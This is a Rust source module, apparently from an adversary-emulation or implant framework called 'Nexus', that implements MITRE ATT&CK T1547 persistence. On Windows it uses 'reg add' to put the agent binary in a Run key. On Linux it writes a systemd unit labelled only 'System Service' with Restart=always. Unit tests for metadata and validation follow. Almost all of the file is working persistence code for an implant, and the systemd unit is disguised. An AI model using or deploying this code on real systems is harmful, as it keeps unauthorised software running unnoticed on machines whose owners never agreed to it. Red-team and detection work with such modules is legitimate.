use nexus_common::{
    AttackTechnique, ExecutionContext, NexusError, Platform, Result, Tactic,
    TechniqueParams, TechniqueResult,
};

/// T1547.001 - Registry Run Keys / Startup Folder
///
/// Establishes persistence by adding an entry to a Windows Registry Run key.
/// The agent binary will execute automatically on user logon.
pub struct RegistryRunKey;

#[async_trait::async_trait]
impl AttackTechnique for RegistryRunKey {
    fn technique_id(&self) -> &str {
        "T1547.001"
    }

    fn name(&self) -> &str {
        "Registry Run Keys / Startup Folder"
    }

    fn tactics(&self) -> &[Tactic] {
        &[Tactic::Persistence, Tactic::PrivilegeEscalation]
    }

    fn platforms(&self) -> &[Platform] {
        &[Platform::Windows]
    }

    fn capabilities(&self) -> Vec<String> {
        vec!["registry_persistence".to_string()]
    }

    fn task_types(&self) -> Vec<String> {
        vec!["registry_persistence".to_string()]
    }

    fn validate(&self, params: &TechniqueParams) -> Result<()> {
        if !params.parameters.contains_key("key_path") {
            return Err(NexusError::TaskExecutionError(
                "Missing key_path parameter".to_string(),
            ));
        }
        if !params.parameters.contains_key("value_name") {
            return Err(NexusError::TaskExecutionError(
                "Missing value_name parameter".to_string(),
            ));
        }
        Ok(())
    }

    async fn execute(
        &self,
        _ctx: &ExecutionContext,
        params: TechniqueParams,
    ) -> Result<TechniqueResult> {
        #[cfg(target_os = "windows")]
        {
            use std::process::Command;
            let key_path = params.parameters.get("key_path").unwrap();
            let value_name = params.parameters.get("value_name").unwrap();

            // Use explicit executable_path if provided, otherwise use current exe
            let exe_path = if let Some(path) = params.parameters.get("executable_path") {
                path.clone()
            } else {
                std::env::current_exe()
                    .map_err(|e| {
                        NexusError::TaskExecutionError(format!(
                            "Failed to get executable path: {}",
                            e
                        ))
                    })?
                    .to_string_lossy()
                    .to_string()
            };

            let output = Command::new("reg")
                .args(&[
                    "add",
                    key_path,
                    "/v",
                    value_name,
                    "/t",
                    "REG_SZ",
                    "/d",
                    &exe_path,
                    "/f",
                ])
                .output()
                .map_err(|e| {
                    NexusError::TaskExecutionError(format!("Registry persistence failed: {}", e))
                })?;

            if output.status.success() {
                Ok(TechniqueResult::ok(format!(
                    "Registry persistence installed: {}\\{} -> {}",
                    key_path, value_name, exe_path
                )))
            } else {
                Ok(TechniqueResult::err(format!(
                    "Registry persistence error: {}",
                    String::from_utf8_lossy(&output.stderr)
                )))
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            let _ = params;
            Err(NexusError::TaskExecutionError(
                "Registry persistence is only available on Windows".to_string(),
            ))
        }
    }
}

/// T1547 - Systemd Service persistence (Linux)
///
/// Establishes persistence by creating a systemd service unit file
/// that starts the agent binary on boot.
pub struct SystemdService;

#[async_trait::async_trait]
impl AttackTechnique for SystemdService {
    fn technique_id(&self) -> &str {
        "T1547"
    }

    fn name(&self) -> &str {
        "Create or Modify System Process: Systemd Service"
    }

    fn tactics(&self) -> &[Tactic] {
        &[Tactic::Persistence, Tactic::PrivilegeEscalation]
    }

    fn platforms(&self) -> &[Platform] {
        &[Platform::Linux]
    }

    fn capabilities(&self) -> Vec<String> {
        vec!["systemd_persistence".to_string()]
    }

    fn task_types(&self) -> Vec<String> {
        vec!["systemd_persistence".to_string()]
    }

    fn validate(&self, params: &TechniqueParams) -> Result<()> {
        if !params.parameters.contains_key("service_name") {
            return Err(NexusError::TaskExecutionError(
                "Missing service_name parameter".to_string(),
            ));
        }
        Ok(())
    }

    async fn execute(
        &self,
        _ctx: &ExecutionContext,
        params: TechniqueParams,
    ) -> Result<TechniqueResult> {
        #[cfg(target_os = "linux")]
        {
            let service_name = params.parameters.get("service_name").unwrap();

            let exe_path = if let Some(path) = params.parameters.get("executable_path") {
                path.clone()
            } else {
                std::env::current_exe()
                    .map_err(|e| {
                        NexusError::TaskExecutionError(format!(
                            "Failed to get executable path: {}",
                            e
                        ))
                    })?
                    .to_string_lossy()
                    .to_string()
            };

            let service_content = format!(
                "[Unit]\n\
                 Description=System Service\n\
                 \n\
                 [Service]\n\
                 ExecStart={}\n\
                 Restart=always\n\
                 \n\
                 [Install]\n\
                 WantedBy=multi-user.target\n",
                exe_path
            );

            let service_path = format!("/etc/systemd/system/{}.service", service_name);

            std::fs::write(&service_path, service_content).map_err(|e| {
                NexusError::TaskExecutionError(format!("Failed to write service file: {}", e))
            })?;

            Ok(TechniqueResult::ok(format!(
                "Systemd service installed: {}",
                service_path
            )))
        }

        #[cfg(not(target_os = "linux"))]
        {
            let _ = params;
            Err(NexusError::TaskExecutionError(
                "Systemd persistence is only available on Linux".to_string(),
            ))
        }
    }
}

/// Register all T1547 sub-techniques
pub fn register() -> Vec<Box<dyn AttackTechnique>> {
    vec![
        #[cfg(target_os = "windows")]
        Box::new(RegistryRunKey),
        #[cfg(target_os = "linux")]
        Box::new(SystemdService),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_registry_run_key_metadata() {
        let tech = RegistryRunKey;
        assert_eq!(tech.technique_id(), "T1547.001");
        assert_eq!(tech.tactics(), &[Tactic::Persistence, Tactic::PrivilegeEscalation]);
        assert_eq!(tech.platforms(), &[Platform::Windows]);
        assert_eq!(tech.task_types(), vec!["registry_persistence".to_string()]);
    }

    #[test]
    fn test_systemd_service_metadata() {
        let tech = SystemdService;
        assert_eq!(tech.technique_id(), "T1547");
        assert_eq!(tech.tactics(), &[Tactic::Persistence, Tactic::PrivilegeEscalation]);
        assert_eq!(tech.platforms(), &[Platform::Linux]);
        assert_eq!(tech.task_types(), vec!["systemd_persistence".to_string()]);
    }

    #[test]
    fn test_register() {
        let techniques = register();
        // On Linux, should have SystemdService; on Windows, RegistryRunKey
        #[cfg(target_os = "linux")]
        assert!(techniques.iter().any(|t| t.technique_id() == "T1547"));
        #[cfg(target_os = "windows")]
        assert!(techniques.iter().any(|t| t.technique_id() == "T1547.001"));
    }

    #[test]
    fn test_registry_run_key_validation() {
        let tech = RegistryRunKey;

        // Missing both params
        let empty_params = TechniqueParams {
            command: String::new(),
            parameters: std::collections::HashMap::new(),
            timeout: None,
        };
        assert!(tech.validate(&empty_params).is_err());

        // Missing value_name
        let mut partial = std::collections::HashMap::new();
        partial.insert("key_path".to_string(), "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string());
        let partial_params = TechniqueParams {
            command: String::new(),
            parameters: partial,
            timeout: None,
        };
        assert!(tech.validate(&partial_params).is_err());

        // All params present
        let mut full = std::collections::HashMap::new();
        full.insert("key_path".to_string(), "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string());
        full.insert("value_name".to_string(), "NexusAgent".to_string());
        let full_params = TechniqueParams {
            command: String::new(),
            parameters: full,
            timeout: None,
        };
        assert!(tech.validate(&full_params).is_ok());
    }

    #[test]
    fn test_systemd_service_validation() {
        let tech = SystemdService;

        let empty_params = TechniqueParams {
            command: String::new(),
            parameters: std::collections::HashMap::new(),
            timeout: None,
        };
        assert!(tech.validate(&empty_params).is_err());

        let mut valid = std::collections::HashMap::new();
        valid.insert("service_name".to_string(), "nexus-agent".to_string());
        let valid_params = TechniqueParams {
            command: String::new(),
            parameters: valid,
            timeout: None,
        };
        assert!(tech.validate(&valid_params).is_ok());
    }
}
